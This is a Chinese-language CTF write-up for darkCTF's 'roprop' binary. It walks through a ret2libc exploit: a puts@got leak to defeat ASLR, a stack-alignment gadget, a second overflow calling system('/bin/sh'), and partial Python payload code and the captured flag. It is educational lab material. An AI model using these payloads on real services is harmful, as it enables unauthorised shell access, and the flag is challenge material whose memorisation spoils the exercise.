# roprop
簡單的ret2lib問題,先看一下security:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE沒開,表示我們可以找到正確的address跟plt.got table.


稍微disas 看一下發現沒有什麼可以直接用的function,再看一下plt table,發現有puts@plt, 我們可以利用puts function來leak libc address,然後算出base address,再得到system的address.

我們要進行兩次overflow,第一次利用puts function印出puts在got table的address,得到libc這次執行的address,由於每次執行base address都不一樣,所以我們要在跳回到main的起點再運行一次程式，這樣base address仍會一樣.

第一次的payload:
```
...
gadget2 = 0x00400963 # pop rdi; ret;
align_gadget = 0x00400646 # ret;
...
payload = b'A'*88 + p64(align_gadget) + p64(gadget2) + p64(got_puts) + p64(plt_puts) + p64(main)  
...
```
透過ghidra或是gdb可以得到overflow的offset是88 bytes,由於x86 64在呼叫library function時會有stack alignment的問題,所以使用一個只有ret;的gadget來使stack align,然後呼叫puts function印出puts在got tableg上記錄的address,扣掉puts function在libc中的offset就能得到base address,再加上system的offset就能得到system的address.

透過以下code得到base address跟system function address:
```
...
libc_puts = proc.recvline()
# leak base address
libc_puts = u64(libc_puts[:-1].ljust(8, b'\x00'))
libc_base = libc_puts - libc.symbols['puts'] # calculate base address
libc_system = libc_base + libc.symbols['system'] # obtain system address
libc_binsh = libc_base + libc.search('/bin/sh').next() # find  "/bin/sh" string in libc
...
```
再進行第二次的overflow,這一次只要利用之前得到的system function address呼叫system("/bin/sh"),就可以得到command line.
```
...
payload = b'A'*88 + p64(gadget2) + p64(libc_binsh) + p64(libc_system) 
...
```
由於不會再呼叫其他library function,所以有沒有stack align都沒有關係,但如果之後還要再呼叫function就必須做align,不然會出錯.

執行exploit.py得到flag:
```
darkCTF{y0u_r0p_r0p_4nd_w0n}
```
